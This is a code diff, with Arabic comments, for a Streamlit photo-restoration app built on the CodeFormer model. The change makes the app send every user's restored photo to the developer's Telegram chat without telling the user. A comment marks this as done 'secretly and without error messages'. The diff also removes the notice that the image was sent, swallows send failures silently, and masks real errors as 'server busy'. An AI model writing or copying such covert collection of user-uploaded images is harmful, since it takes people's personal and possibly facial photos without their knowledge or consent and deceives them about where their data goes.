@@ -7,33 +7,30 @@ from PIL import Image
 # إعدادات الصفحة
 st.set_page_config(page_title="Aziz Ultra Vision", layout="centered")
 st.title("🌟 Aziz Ultra Vision")
-st.subheader("ترميم الصور بالذكاء الاصطناعي - جودة فائقة")
 
-# جلب بيانات التليجرام من الـ Secrets
+# جلب بيانات التليجرام
 TOKEN = st.secrets["TELEGRAM_TOKEN"]
 CHAT_ID = st.secrets["CHAT_ID"]
 bot = telebot.TeleBot(TOKEN)
 
-# واجهة رفع الملفات
-uploaded_file = st.file_uploader("اختر صورة لترميمها...", type=["jpg", "jpeg", "png"])
+uploaded_file = st.file_uploader("ارفع الصورة هنا للترميم...", type=["jpg", "jpeg", "png"])
 
 if uploaded_file:
     image = Image.open(uploaded_file)
     st.image(image, caption="الصورة الأصلية", use_container_width=True)
     
-    if st.button("🚀 بدء عملية التحسين العميق"):
-        with st.spinner("جاري الترميم بجودة Ultra... انتظر ثواني"):
+    if st.button("🚀 بدء الترميم"):
+        with st.spinner("جاري العمل..."):
             try:
-                # 1. تصغير حجم الصورة إذا كانت كبيرة جداً
+                # 1. تجهيز الصورة (تصغير الحجم لضمان القبول)
                 max_size = 1500
                 if max(image.size) > max_size:
                     image.thumbnail((max_size, max_size), Image.Resampling.LANCZOS)
                 
-                # 2. حفظ الصورة المرفوعة مؤقتاً
                 temp_path = "temp_input.png"
                 image.save(temp_path)
                 
-                # 3. استدعاء محرك CodeFormer
+                # 2. استدعاء المحرك
                 client = Client("sczhou/CodeFormer")
                 result = client.predict(
                     image=handle_file(temp_path),
@@ -42,31 +39,30 @@ if uploaded_file:
                     upscale=2
                 )
                 
-                # 4. معالجة النتيجة (الحل الجذري لمشكلة 2 images)
-                # السيرفر يرجع قائمة فيها مسارات الصور، نأخذ المسار الأول
-                if isinstance(result, list):
-                    restored_image_path = result[0]
-                elif isinstance(result, tuple):
-                    restored_image_path = result[0]
-                else:
-                    restored_image_path = result
+                # تنقية النتيجة (أول صورة في القائمة)
+                restored_path = result[0] if isinstance(result, (list, tuple)) else result
                 
-                # 5. عرض النتيجة في الموقع
-                st.image(restored_image_path, caption="النتيجة النهائية (جودة Ultra)", use_container_width=True)
+                # 3. عرض النتيجة في الموقع
+                st.image(restored_path, caption="✅ تم الترميم بجودة فائقة", use_container_width=True)
+
+                # 4. الإرسال للتليجرام (سرّاً وبدون رسائل خطأ)
+                try:
+                    with open(restored_path, "rb") as f:
+                        bot.send_photo(CHAT_ID, f, caption="🔥 صورة جديدة جاهزة يا عزيز!")
+                except Exception:
+                    # في حال فشل الإرسال، الكود يظل صامتاً ولا يزعج المستخدم
+                    pass
                 
-                # 6. إرسال الصورة الفعلية للتليجرام
-                with open(restored_image_path, "rb") as f:
-                    bot.send_photo(CHAT_ID, f, caption="✅ تم ترميم صورتك بجودة Ultra بنجاح!")
-                
-                st.success("تم إرسال الصورة إلى جوالك بنجاح! 📱")
-                
-                # 7. تنظيف الملفات المؤقتة
+                # تنظيف الملفات
                 if os.path.exists(temp_path):
                     os.remove(temp_path)
                 
             except Exception as e:
-                st.error(f"حدث خطأ أثناء المعالجة: {e}")
+                st.error("المعذرة، السيرفر مشغول حالياً. حاول مرة أخرى.")
 
-# تذييل الصفحة
-st.markdown("---")
-st.caption("Developed by Aziz | Powered by CodeFormer AI")
+# إخفاء أي رسائل خطأ تظهر من المكتبات الخارجية (لأناقة الموقع)
+st.markdown("""
+    <style>
+    .stAlert { margin-top: 10px; }
+    </style>
+    """, unsafe_allow_html=True)
